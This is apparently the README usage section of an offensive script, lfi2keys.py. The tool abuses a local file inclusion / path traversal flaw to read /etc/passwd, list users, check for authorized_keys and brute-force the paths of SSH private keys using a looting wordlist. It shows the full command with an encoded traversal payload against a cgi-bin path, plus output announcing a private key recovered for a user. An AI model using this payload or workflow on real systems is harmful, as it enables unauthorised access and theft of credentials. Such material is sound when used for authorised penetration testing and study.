# Usage
Provide the full path of the affected endpoint with the LFI/ path traversal vulnerability with the `/etc/passwd` file and a private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists).

```bash
┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l /usr/share/wordlists/ssh-key-looting/ssh-priv-key-loot-medium.txt   

  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\ \ / / __|
 | |__| _| | | / /| ' <| _| \ V /\__ \
 |____|_| |___/___|_|\_\___| |_| |___/
                                      
LFI to SSH Private Keys - Automated Looting Script

[+] Valid /etc/passwd file found
[+] Active users exported:
    miranda -> /home/miranda
    steven -> /home/steven
    mark -> /home/mark
    nick -> /home/nick
[+] Checking for authorized_keys ...
[!] Found authorized_keys for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/authorized_keys
    [*] SSH key-based authentication is enabled for user nick.
[+] Starting to FUZZ
[+] Private key found for nick at: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/id_ecdsa
[+] Done (～￣▽￣)～
```

# Credits
- [PinoyWH1Z](https://github.com/PinoyWH1Z) for his [wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)